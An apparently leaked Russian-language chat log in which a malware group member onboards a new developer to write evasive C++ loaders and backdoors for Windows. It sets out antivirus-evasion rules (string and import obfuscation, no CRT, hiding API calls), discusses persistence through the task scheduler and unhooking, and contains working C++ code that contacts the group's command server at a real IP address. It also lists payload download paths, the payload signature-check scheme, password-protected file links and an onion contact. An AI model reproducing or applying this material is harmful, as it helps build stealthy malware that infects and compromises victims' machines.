Timestamp	From	To	Message
2020-08-13 10:47:56.146637	van	bourbon	Привет!
2020-08-13 10:49:46.955162	bourbon	van	Привет!
2020-08-13 10:50:40.183545	van	bourbon	Мне сказали, что тебя надо ввести  курс дела.
2020-08-13 10:51:20.514897	bourbon	van	да, хотелось бы побольше ясности о работе
2020-08-13 10:51:37.290090	van	bourbon	ты здесь новенький?
2020-08-13 10:51:44.430270	bourbon	van	да
2020-08-13 10:51:51.900261	van	bourbon	ага
2020-08-13 10:52:17.659835	van	bourbon	моя бригада пишет на с++ лоадеры-бэкдоры
2020-08-13 10:52:25.982229	van	bourbon	начальник наш в отпуске
2020-08-13 10:53:02.884681	van	bourbon	У тебя нет пока задания? ТЗ не выдавали? Или уже есть?
2020-08-13 10:53:49.710623	bourbon	van	нет, ничего нет. Я только пол часа, как присоединился
2020-08-13 10:54:09.998008	van	bourbon	так даже лучше ))
2020-08-13 10:54:30.768853	bourbon	van	))
2020-08-13 10:54:52.829000	van	bourbon	я сейчас пришлю тебе текстовый файл для изучения
2020-08-13 10:56:00.392175	bourbon	van	я писал viper, что пока что я еще на основной работе. Поэтому, возможно, что пока что не всегда смогу оперативно реагировать на сообщения. Он сказал, что пока это не проблема, а там посмотрим
2020-08-13 10:56:46.527345	van	bourbon	ок
2020-08-13 10:56:51.572222	van	bourbon	Dfnc(fdsw32bh

Download: https://qaz.im/load/h5YAA3/is97ST
2020-08-13 10:56:58.757880	van	bourbon	пароль и ссылка
2020-08-13 10:57:10.373388	van	bourbon	забери и почитай
2020-08-13 10:58:04.384852	van	bourbon	когда будешь готов, пришлю ТЗ для ознакомления с тем, что мы пишем.
2020-08-13 10:58:49.123084	bourbon	van	файл получил.  В ближайшее время ознакомлю
2020-08-13 10:58:50.404284	van	bourbon	пиши
2020-08-13 10:58:54.888656	bourbon	van	ознакомлюсь
2020-08-13 10:59:03.701168	bourbon	van	ок
2020-08-13 10:59:40.865505	van	bourbon	хорошо, решай свои дела, почитай
2020-08-13 11:00:13.954608	van	bourbon	у нас тут интересно
2020-08-13 11:03:02.641307	bourbon	van	))
2020-08-14 07:51:41.235531	bourbon	van	Привет. С документом ознакомился. Интересная информация)
2020-08-14 07:51:49.151872	bourbon	van	Готов двигаться дальше
2020-08-14 07:52:03.479336	van	bourbon	Привет!
2020-08-14 07:53:05.626392	van	bourbon	Я пришлю для примера ТЗ на бэкдор, почитай.
2020-08-14 07:53:19.964189	bourbon	van	интересно)
2020-08-14 08:04:55.455924	van	bourbon	Ты пишешь под Windows?
2020-08-14 08:09:39.355647	bourbon	van	да
2020-08-14 08:09:47.615843	van	bourbon	хорошо
2020-08-14 08:21:40.082140	van	bourbon	Dfnc(fdsw32bh
Download: https://qaz.im/load/f7Ez24/DH34Q9
Это не для реализации, пока просто посмотри, как и что.

Сразу скажу некоторые требования.
1. Visual Studio не ниже 2017.
2. Программы пишем минимального размера.
3. Не используем STL и даже CRT.
4. Вместо привычных функций CRT используем их аналоги из WinApi.
5. Распределение/освобождение памяти через VirtualAlloc. Есть кой-какие готовые
библиотеки (в исходниках) подходящие для нас. Выдам позже.   
6. Обфускация всех строк. Библиотеку выдам.
7. Если можно так сказать, то обфускация всего импорта. Нельзя увидеть в exe импорт функций.
Тоже есть библиотека, выдам.
8. Лучше не использовать классы. Хотя и можно. Если нет CRT, то с классами будут некоторые заморочки, например, не скомпилируются глобальные экземпляры классов, т.к. конструктор некому вызвать.
Начальник  у нас в отпуске, и я пока не знаю, на какие задачи тебя нацелят. Так что пока общее понимание нашей жизни ))).
2020-08-14 08:22:45.222017	van	bourbon	А может, ты уже всё знаешь и я зря пишу так много букв? )))
2020-08-14 08:23:41.723760	bourbon	van	))) не, с таким так близко сталкиваться еще не приходилось
2020-08-14 08:24:17.052693	van	bourbon	ну, тогда постепенно всё узнаешь
2020-08-14 08:24:32.702493	van	bourbon	давно на с++ пишешь?
2020-08-14 08:25:33.245340	bourbon	van	на первый взгляд кажется - как много требований. Хотя, наверное, один проект сделать и все будет понятно
2020-08-14 08:25:48.999036	van	bourbon	да конечно
2020-08-14 08:26:02.815528	bourbon	van	10 лет
2020-08-14 08:26:48.523114	bourbon	van	в основном я писал c++ и stl. Для бэкэнда этого почти всегда хватало
2020-08-14 08:27:15.693387	van	bourbon	Отлично! Используем минималистичный с++, все современные прибамбасы пока отложим. )))
2020-08-14 08:27:36.850806	bourbon	van	это радует)
2020-08-14 08:27:51.878089	van	bourbon	у тебя уже есть доступ в гит, редмайн?
2020-08-14 08:28:12.833312	bourbon	van	нет
2020-08-14 08:30:04.672940	van	bourbon	Ладно, с начальником решим, когда появится. Начальник у нас с тобой - Buza. Отличный программист, умный человек. С ним приятно общаться.
2020-08-14 08:31:15.253335	bourbon	van	))
2020-08-14 08:33:39.774552	van	bourbon	Пока читай. Сегодня я уже не буду тебя донимать. Посмотрю, что Буза ответит. На след. неделе продолжим.
2020-08-14 08:34:00.764481	van	bourbon	Ты в каком часовом поясе? МСК?
2020-08-14 08:34:09.559772	bourbon	van	мск
2020-08-14 08:34:45.902444	bourbon	van	хорошо, буду читать, изучать, вникать. Пока все кажется очень интересным)
2020-08-14 08:34:54.234749	van	bourbon	ок)
2020-08-17 11:11:30.249941	van	bourbon	Привет!
2020-08-17 11:14:05.296401	bourbon	van	Привет!
2020-08-17 11:14:22.663890	bourbon	van	Я ознакомился с документами
2020-08-17 11:14:23.160913	van	bourbon	Как дела? Ты с нами?
2020-08-17 11:14:54.301827	bourbon	van	на первый взгляд, достаточно сложное ТЗ
2020-08-17 11:15:36.522834	van	bourbon	так, я переговорил с начальниками, решили тебя подключить к нашей бригаде
2020-08-17 11:15:49.977266	bourbon	van	да, мне было бы очень интересно этим заниматься. Много ограничений, которые нужно обходить
2020-08-17 11:16:00.879924	van	bourbon	я давал тебе ТЗ на бэкдор.
2020-08-17 11:16:30.919352	bourbon	van	но, прочитав тз, стало несколько страшновато, что ли, что получится ли потянуть подобное. Но попробовать бы очень хотелось
2020-08-17 11:16:57.714629	bourbon	van	мне кажется, что это одно из самых простых тз
2020-08-17 11:17:45.331197	van	bourbon	я отвлекусь на 20 минут, потом расскажу планы
2020-08-17 11:20:10.506185	van	bourbon	я здесь
2020-08-17 11:20:54.132551	bourbon	van	я тоже
2020-08-17 11:21:32.950456	van	bourbon	бэкдор пока отложим, будто он уже написан и залит на сервер ))
а ты займешься лоадером
2020-08-17 11:22:20.923254	van	bourbon	Я сброшу тебе ТЗ, прочтешь и вместе пройдем по созданию проекта и реализации.
2020-08-17 11:22:33.587445	bourbon	van	ок
2020-08-17 11:22:48.903469	van	bourbon	Надо мне одновременно создать методичку по написанию лоадера.
2020-08-17 11:23:06.658937	van	bourbon	Вот вместе и сделаем.
2020-08-17 11:29:43.626946	van	bourbon	Dfnc(fdsw32bh
Download: https://qaz.im/load/B5rn7Y/9Zez88
2020-08-17 11:29:50.921206	van	bourbon	это ТЗ
2020-08-17 11:29:58.148221	van	bourbon	уже в работу
2020-08-17 11:30:19.040788	bourbon	van	получил
2020-08-17 11:30:34.362060	van	bourbon	почитай
2020-08-17 11:30:40.302444	van	bourbon	пишем на c++
2020-08-17 11:30:57.309237	van	bourbon	у тебя VS 2017 &
2020-08-17 11:31:01.983301	van	bourbon	?
2020-08-17 11:31:08.801834	bourbon	van	2019
2020-08-17 11:31:21.672660	van	bourbon	пусть будет
2020-08-17 11:31:51.742600	van	bourbon	сегодня читай и мечтай
2020-08-17 11:32:17.101712	van	bourbon	я завтра выдам все нужные библиотеки
2020-08-17 11:32:30.011161	bourbon	van	ок
2020-08-17 11:34:36.381988	van	bourbon	и помни с первой строчки о том, что мало реализовать функционал по ТЗ, надо еще увернуться от АВ (антивирусов)
2020-08-17 11:36:14.253415	van	bourbon	Вот помечтай над техникой закрепления. Как бы ты закрепил лоадер в системе. Есть ссылки в документах на эти техники. И это надо обсудить.
2020-08-17 11:36:39.303396	bourbon	van	подумаю над этим
2020-08-17 11:36:44.253505	van	bourbon	завтра выдам очередную порцию инфо
2020-08-17 11:37:58.017768	bourbon	van	))
2020-08-19 07:57:05.471667	bourbon	van	Привет! Я извиняюсь, вчера не получилось ни быть на связи, ни проинформировать, что не смогу быть на связи
2020-08-19 07:57:44.171246	van	bourbon	Привет! Ничего, бывает.
2020-08-19 07:59:05.021505	van	bourbon	Я тебе приготовил материалы.
2020-08-19 07:59:06.326225	bourbon	van	я прочитал тз
2020-08-19 07:59:11.554108	van	bourbon	хорошо
2020-08-19 07:59:36.665512	bourbon	van	и подумал над ним. И даже пытался помечтать, как же все это сделать по красоте
2020-08-19 08:00:24.557825	bourbon	van	если б это было обычное приложение, то, в принципе, закрепление в системе - задание несложное
2020-08-19 08:00:36.053887	van	bourbon	я тебе сейчас пришлю библиотеки наши
2020-08-19 08:01:17.102699	bourbon	van	а вот с учетом того, чтобы АВ никак этого не заметил - вот тут я зашел в тупик. Все методики, от самых простых до каких-то более сложных детектятся АВ просто так
2020-08-19 08:01:24.499614	bourbon	van	как их обойти - вот хз прям
2020-08-19 08:01:51.683237	van	bourbon	Dfnc(fdsw32bh
Download: https://qaz.im/load/nfrHQY/fhhfQe
2020-08-19 08:02:04.642613	van	bourbon	пойдем от простого к сложному
2020-08-19 08:03:07.370524	van	bourbon	Я начал разрабатывать методичку по написанию лоадера.
Сейчас просто куски пришлю. Что не понятно будет - уточним.
2020-08-19 08:03:26.569631	bourbon	van	хорошо
2020-08-19 08:03:32.297724	bourbon	van	библиотеки получил
2020-08-19 08:03:38.238332	van	bourbon	ок
2020-08-19 08:03:41.163149	van	bourbon	1. Файл config.h - настройки сборки, заготовка содержит путь к логу и настройку лога.


2. Подключение библиотек.

#include "log/console.h"
#include "getapi/Memory.h"
#include "getapi/GetApi.h"
#include "getapi/Strings.h"
#include "obfuscated/strobfuscator.h"
#include "config.h"



int main()
{
	InitializeAPI();
	Console_Open((char*)LOG_PATH);//для лога

	int r = 5;
	debug_printf("test msg: %d", r);
	debug_printfw(L"test msg: %d", r);
	
	
	char *s = _STR("string 1"); // "string 1" будет обфусцирована, в exe-файле, в строках, не видна.
	

	return 0;
}	


3. Настройка проекта.
Лоадер должен выдавать 8 вариантов. Сборка в виде exe и dll. 
Release_logged x64
Release_nologs x64
Release_logged x86
Release_nologs x86
Release_dll_logged x64
Release_dll_nologs x64
Release_dll_logged x86
Release_dll_nologs x86

Debug - на свое усмотрение.

В конфигурациях Release_nologs, Release_dll_nologs, чтобы отключить вывод в лог, определить RELEASE_NOLOG, debug_printf разрешаются в пусто.
В конфигурациях *_dll_* определить LOADER_DLL.

В код включить следующее.
#ifdef LOADER_DLL
#ifdef __cplusplus
extern "C"
{
#endif
__declspec(dllexport) int StartFunc();
#ifdef __cplusplus
}
#endif

#endif

#ifdef LOADER_DLL
__declspec(dllexport) int StartFunc()
#else
int main()
#endif
{
  return 0;
}
2020-08-19 08:04:27.833914	van	bourbon	создай тестовый проект консольный и попробуй библиотеки - на сегодня всё пока
2020-08-19 08:04:44.238077	bourbon	van	буду разбираться)
2020-08-19 08:04:58.325186	van	bourbon	потом попробуем создать и настроить рабочий проект
2020-08-19 08:08:53.889790	van	bourbon	в конце getapi.h есть определения функций, которые надо использовать, например,
char b[64];
plstrcpyA(b, _STR("string"));
2020-08-19 08:09:01.784700	van	bourbon	но!
2020-08-19 08:11:13.841122	van	bourbon	Некоторые из них не работают ))), многих функций из нужных нет совсем. Завтра пришлю пример обфусцированной загрузки функций из dll.
2020-08-19 08:12:33.713515	bourbon	van	)) понятно) буду пробовать, что работает, а что нет
2020-08-19 08:12:37.262350	bourbon	van	)
2020-08-19 08:12:55.208396	van	bourbon	да не надо все перебирать - с ума сойдешь
2020-08-19 08:13:05.501751	van	bourbon	в основном, все работают
2020-08-19 08:13:37.448729	van	bourbon	просто можешь потом столкнуться с тем, что что-то не идет, просто предупредил )))
2020-08-19 08:14:00.956926	bourbon	van	а, понятно) буду иметь это ввиду)
2020-08-20 08:41:10.356597	van	bourbon	Привет!
2020-08-20 08:41:25.640167	bourbon	van	Привет! Со вчерашней информацией ознакомился.
2020-08-20 08:41:36.909784	van	bourbon	ага
2020-08-20 08:41:46.694893	bourbon	van	есть один вопросик
2020-08-20 08:41:52.561897	van	bourbon	давай
2020-08-20 08:41:57.792093	bourbon	van	вызов функций Wina
2020-08-20 08:42:26.769424	bourbon	van	вызов функций WinAPI не по имени, а по адресу разве никак не детектится АВ?
2020-08-20 08:42:40.477908	bourbon	van	это же прям красный флаг для них должен быть
2020-08-20 08:42:56.856141	bourbon	van	учитываю, что адреса функций внутри dll вроде как статичные
2020-08-20 08:43:41.290160	van	bourbon	в любом случае функции вызываются по адресу. Но их имена светятся в импорте. Я вот подготовил след. порцию инфо.
2020-08-20 08:43:44.081768	van	bourbon	Dfnc(fdsw32bh
Download: https://qaz.im/load/iShByt/frkH7A

Это пример использования функций из dll. Не через подключение .lib файлов к проекту, а именно так, тогда эти функции не видны в импорте.
Ничего особенного, кроме того, что строки обфусцированы и используются
pLoadLibraryA
pGetProcAddress
из getapi.

Тип из настоящего имени делаем добавлением _t, а указатель с использованием p_.
Добавляй все нужные функции. Понятно,  что в libload.h будут добавляться, возможно, заголовочные файлы для этих функций.
2020-08-20 08:44:33.438760	van	bourbon	другое дело, что АВ ставят хуки на важные функции из ntdll, например.
2020-08-20 08:44:56.221065	van	bourbon	тогда хоть как вызывай - попадешься
2020-08-20 08:45:11.056908	van	bourbon	снятие хуков - отдельная тема будет
2020-08-20 08:45:28.090448	bourbon	van	понятно. Спасибо)
2020-08-20 08:47:08.773408	van	bourbon	завтра по рабочему проекту поговорим
2020-08-20 08:47:46.721656	bourbon	van	ого! постараюсь подготовиться
2020-08-21 08:10:20.229205	bourbon	van	Привет!
2020-08-21 08:10:31.242619	van	bourbon	Привет!
2020-08-21 08:11:11.458465	van	bourbon	Я по уши завяз в своих делах, пока по проекту некогда поговорить (((
2020-08-21 08:12:26.480402	bourbon	van	у меня появилось дополнительное время на подумать)
2020-08-21 08:14:32.617196	van	bourbon	Ага. Создай проект новый, один конфиг из восьми сделай пока. Попробуй, используя, например wininet, дать запрос в нашу админку, адрес я дам. Получи заголовки и тело ответа. И мне пришли.
2020-08-21 08:16:01.232813	bourbon	van	ок
2020-08-21 08:26:56.534299	van	bourbon	https://51.89.125.28:12234/api/v86
в заголовок запроса добавь:
update: /api/
запрос типа HEAD сделай
2020-08-21 08:28:39.167382	bourbon	van	ок
2020-08-21 08:33:16.403258	van	bourbon	да, там http, не https, если что...
2020-08-25 08:16:19.131648	bourbon	van	Привет!
2020-08-25 08:16:31.115686	van	bourbon	Привет!
2020-08-25 08:16:35.654897	bourbon	van	Указанный адрес сейчас недоступен?
2020-08-25 08:16:43.752698	bourbon	van	делаю запросы, но ответа нет
2020-08-25 08:17:04.125520	van	bourbon	должен быть доступен, погоди, проверю
2020-08-25 08:19:55.542509	van	bourbon	http://51.89.125.28:12234/api/v86 - доступен (http)
2020-08-25 08:20:22.948945	van	bourbon	попробуй еще
2020-08-25 08:20:38.558767	van	bourbon	не получится, - покажи код
2020-08-25 08:21:27.954950	van	bourbon	запрос HEAD ?
2020-08-25 08:22:30.792792	bourbon	van	сейчас что-то отвечает
2020-08-25 08:22:38.951598	bourbon	van	на GET какой-то ответ есть
2020-08-25 08:22:44.176636	bourbon	van	а на HEAD не отвечает
2020-08-25 08:22:51.814795	bourbon	van	точнее тела нет, только заголовки
2020-08-25 08:23:06.171563	van	bourbon	покажи заголовки
2020-08-25 08:23:20.549865	bourbon	van	секундочку
2020-08-25 08:24:14.569885	bourbon	van	int WinInetWork::getAnswFromUrl()
{
    InitializeAPI();
    Console_Open((char*)LOG_PATH);


    // Init WinInet
    HINTERNET hInternet =
        pInternetOpenA(
            TEXT(_STR("")),
            INTERNET_OPEN_TYPE_PRECONFIG,
            NULL, NULL,
            0);
    if (hInternet != NULL)
    {
        // Open HTTP session
        HINTERNET hConnect =
            pInternetConnectA(
                hInternet,
                TEXT(_STR("51.89.125.28")),
                12234,
                NULL, NULL,
                INTERNET_SERVICE_HTTP,
                0,
                1u);
        if (hConnect != NULL)
        {
            // Open request
            HINTERNET hRequest =
                pHttpOpenRequestA(
                    hConnect,
                    TEXT(_STR("HEAD")),
                    TEXT(_STR("/api/v86")),
                    NULL,
                    NULL,
                    0,
                    INTERNET_FLAG_KEEP_CONNECTION,
                    1);
            if (hRequest != NULL)
            {
                char szBody[1024];
                DWORD dwBytesBody;
                char szHdrs[1024];
                DWORD dwBytesHdrs;
                BOOL bRead = 0;
                const char *headers = _STR("update: /api/\r\n\r\n");

                BOOL bSend = (BOOL)pHttpSendRequestA(hRequest, (LPCSTR)headers, m_lstrlen(headers), NULL, 0);
                if (bSend)
                {
                    bRead = (BOOL)pInternetReadFile(
                        hRequest,
                        szBody, sizeof(szBody) - 1,
                        &dwBytesBody);

                    if (bRead != FALSE)
                    {
                        if (dwBytesBody != 0)
                        {
                            szBody[dwBytesBody] = 0;
                            debug_printf(_STR("Body: %s"), szBody);
                        }
                        else
                            debug_printf(_STR("No body"));

                        BOOL bHdrs = (BOOL)pHttpQueryInfoA(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, (LPVOID)szHdrs, &dwBytesHdrs, NULL);
                        if (bHdrs != FALSE)
                        {
                            if (dwBytesHdrs != 0)
                            {
                                szHdrs[dwBytesHdrs] = 0;
                                debug_printf(_STR("Headers: %s"), szHdrs);
                            }
                            else
                                debug_printf(_STR("No headers"));
                        }
                        else
                            return 7;
                    }
                    else
                        return 5;
                }
                else
                    return 4;

                // Close request
                pInternetCloseHandle(hRequest);
            }
            else
                return 3;

            // Close session
            pInternetCloseHandle(hConnect);
        }
        else
            return 2;

        // Close WinInet
        pInternetCloseHandle(hInternet);
    }
    else
        return 1;

    return 0;
}
2020-08-25 08:24:36.074286	bourbon	van	заголовки
2020-08-25 08:24:37.263968	bourbon	van	const char *headers = _STR("update: /api/\r\n\r\n");
2020-08-25 08:25:10.627635	van	bourbon	заголовки, которые получаешь от сервера можешь показать?
2020-08-25 08:25:31.620143	bourbon	van	секундочку
2020-08-25 08:26:13.838027	bourbon	van	HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Tue, 25 Aug 2020 08:25:38 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
2020-08-25 08:26:18.335366	bourbon	van	при запросе HEAD
2020-08-25 08:26:37.542737	bourbon	van	тела нет
2020-08-25 08:26:52.212718	van	bourbon	нет, заголовки не наши...
2020-08-25 08:27:44.183760	van	bourbon	погоди, сделаю запрос сам
2020-08-25 08:28:04.795900	bourbon	van	а на get вот такие заголовки
2020-08-25 08:28:05.736942	bourbon	van	HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Tue, 25 Aug 2020 08:19:42 GMT
Content-Type: application/octet-stream
Content-Length: 585920
Connection: keep-alive
Vary: Accept
Pragma: public
Accept-Ranges: bytes
Expires: 0
Cache-Control: must-revalidate, post-check=0, pre-check=0
Content-Disposition: attachment; filename="5VZxZRm1mc0oM4BmsnGI"
2020-08-25 08:29:30.847066	van	bourbon	это файл ты получаешь, и размер правильный, но заголовки не все...
2020-08-25 08:39:42.655704	van	bourbon	заголовок для запроса HEAD надо такой:
update: /api/v86
2020-08-25 08:40:57.000922	van	bourbon	попробуй и пришли заголовки, которые вернуться
на запрос HEAD нас интересуют только возвращаемые заголовки
2020-08-25 08:41:49.642911	bourbon	van	HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Date: 08:40:43
X-Tag: 100
2020-08-25 08:41:52.177015	bourbon	van	такие
2020-08-25 08:42:21.617763	van	bourbon	во, X-Tag: 100 - это версия файла - правильно
2020-08-25 08:42:58.101370	van	bourbon	но не хватает еще цифровой подписи, я написал хозяину сервера
2020-08-25 08:43:09.974245	van	bourbon	подождем
2020-08-25 08:43:23.709149	bourbon	van	тоже в заголовке должна быть?
2020-08-25 08:43:28.537073	van	bourbon	ага
2020-08-25 08:43:38.432537	van	bourbon	сейчас включат...
2020-08-25 08:46:38.659028	van	bourbon	пробуй
2020-08-25 08:46:58.123653	van	bourbon	лоадер собирается для определенной группы, в каждой группе есть 4 пути, которые лоадер использует
2020-08-25 08:47:40.322953	bourbon	van	HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Date: 2020-08-25 08:46:56
X-Tag: 100
Set-Cookie: SID=dBddyG2Kenz30NxidT4YZ%2BhUsHCqmq1%2FKpTqoBTaAzb0Nx9IcCqls0mslW0%2FBhRAq0bR2roH5agvvyyz1zNMT15B1dBpvn6XCYRa4lVYRc0w%2FG9IrelKeGHSAZsy4ckf
2020-08-25 08:47:56.022015	van	bourbon	ок, всё правильно
2020-08-25 08:48:25.133601	bourbon	van	4 пути для группы. А групп много?
2020-08-25 08:49:11.662327	van	bourbon	сколько групп нас не интересует, ты в одной определенной будешь работать
2020-08-25 08:50:21.191845	van	bourbon	я дал тебе один из 4-х путей своей тестовой группы "1" - группы обозначаются строкой, 1 - это строка
2020-08-25 09:05:51.740399	van	bourbon	принцип проверки подписи такой:
из заголовка берется первые десять символов поля
Date: 2020-08-25 08:46:56
т.е. 2020-08-25
на сервере строка 2020-08-25 подписывается закрытым ключом,
подпись помещается в поле SID.
Ты должен взять первые десять символов поля
Date: 2020-08-25 08:46:56,
у тебя в лоадере будет зашит открытый ключ и с его помощью проверить подпись
2020-08-25 09:08:18.932186	van	bourbon	для группы один, в кот. ты пока будешь работать, пути такие
v85 – путь загрузки лоадера 32
v86 – путь загрузки лоадера 64
v87 – путь загрузки бэкдора 32
v88 – путь загрузки бэкдора 64
2020-08-25 09:09:30.121417	van	bourbon	пока двигайся по ТЗ, решай, как реализовывать будешь
2020-08-25 09:09:42.759312	van	bourbon	я позже пришлю код проверки подписи
2020-08-25 09:10:14.660927	van	bourbon	добавишь в проект и проверишь на уже принятых заголовках
2020-08-25 09:12:01.943958	van	bourbon	когда говорим, что лоадер собран для такой-то группы, значит вот эти 4 пути определенные зашиты в лоадер, так что вводи их через config.h
2020-08-25 09:17:06.810185	bourbon	van	ок
2020-08-31 08:48:32.236699	van	bourbon	Привет! Как успехи?
2020-08-31 08:53:27.785763	bourbon	van	Привет!
2020-08-31 08:53:56.778547	bourbon	van	в основном все понятно и реализуемо
2020-08-31 08:54:25.261446	bourbon	van	единственное не очень понятно про получение адресов через Emercoin, но с этим я еще толком не разбирался
2020-08-31 08:55:02.380795	bourbon	van	и основная проблема, как запуститься после перезагрузки. Где и как себя прописать, чтобы никто ничего не заметил
2020-08-31 08:55:51.453676	van	bourbon	Эмеркоин - это не главное, код я дам. А вот закрепление в системе каждый решает по-своему )))
2020-08-31 08:56:12.312618	bourbon	van	уже подумывал анализировать список имеющихся запланированных задач (типа обновление хрома, акробата, ...) и заменить файл по используемому пути на свой. Но что-то мне кажется, что это не самый удачный вариант
2020-08-31 08:57:04.625658	van	bourbon	планировщик используют вообще-то для закрепа
2020-08-31 08:58:05.260956	bourbon	van	ну если явно самого себя там прописать и антивирь заругается, скорее всего да и глазками будет видно, что какая-то лишняя хрень там прописалась и ничего не помешает ее оттуда удалить
2020-08-31 08:58:24.987429	bourbon	van	в реестр лезть вообще не вариант, как я думаю
2020-08-31 08:58:38.892305	bourbon	van	и вариантов почти и не остается
2020-08-31 08:58:39.928505	van	bourbon	так используют сразу несколько способов, что выстрелит...
2020-08-31 08:58:49.655076	van	bourbon	пробуй )))
2020-08-31 08:59:38.318277	bourbon	van	))
2020-08-31 09:00:42.411720	bourbon	van	а каким образом будет обеспечен самый первый запуск на целевом хосте? Вряд ли кто-то будет сам запускать левую и непонятную exe'ire
2020-08-31 09:00:49.353860	bourbon	van	*exe'шку
2020-08-31 09:18:25.216964	van	bourbon	это не наша с тобой забота )))
2020-08-31 09:19:11.461813	bourbon	van	))
2020-09-07 12:50:56.691025	van	bourbon	не очень... последний раз 31.08 писал
2020-09-07 12:51:18.158362	van	bourbon	вопросы должны быть каждый день...
2020-09-07 12:52:28.968532	van	bourbon	не тебе написал )))
2020-09-07 12:52:38.801244	van	bourbon	как дела?
2020-09-07 13:24:16.490147	bourbon	van	Привет!
2020-09-07 13:24:30.773532	van	bourbon	Привет!
2020-09-07 13:24:49.951121	bourbon	van	У меня мессенджер заглючил и я не прочитал сообщения. Видел, что были новые, но прочитать не смог...
2020-09-07 13:25:00.036072	bourbon	van	можешь, пожалуйста, их повторить
2020-09-07 13:25:08.072702	van	bourbon	Тебя передали от меня Кактусу. Спишись с ним.
2020-09-07 13:25:37.434192	bourbon	van	у меня нет такого контакта
2020-09-07 13:25:40.073558	van	bourbon	kaktus@q3mcco35auwcstmt.onion
2020-09-07 13:26:08.760287	bourbon	van	ок, спасибо
2020-09-07 13:26:41.372141	van	bourbon	Не за что! Успехов! Пиши, если что... )))
2020-09-07 13:27:05.540695	bourbon	van	а так то тз про бэкдор уже неактуально?
2020-09-07 13:27:28.163332	van	bourbon	актуально, Кактус на этом же сидит
2020-09-07 13:27:51.704702	van	bourbon	Просто, меня разгрузили
2020-09-07 13:28:01.149876	bourbon	van	понятно)
